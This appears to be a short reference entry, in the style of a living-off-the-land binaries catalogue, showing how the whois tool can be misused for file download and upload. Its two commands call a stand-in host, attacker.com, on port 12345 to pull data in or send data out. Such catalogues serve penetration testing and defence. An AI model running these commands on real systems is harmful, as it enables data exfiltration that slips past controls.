title: whois
html:
whois

Download

Context: sudo, suid, unprivileged

whois -h attacker.com -p 12345 x

Upload

Context: sudo, suid, unprivileged

whois -h attacker.com -p 12345 DATA
excerpt: whois Download Context: sudo, suid, unprivileged whois -h attacker.com -p 12345 x Upload Context: sudo, suid, unprivileged whois -h attacker.com -p 12345 DATA
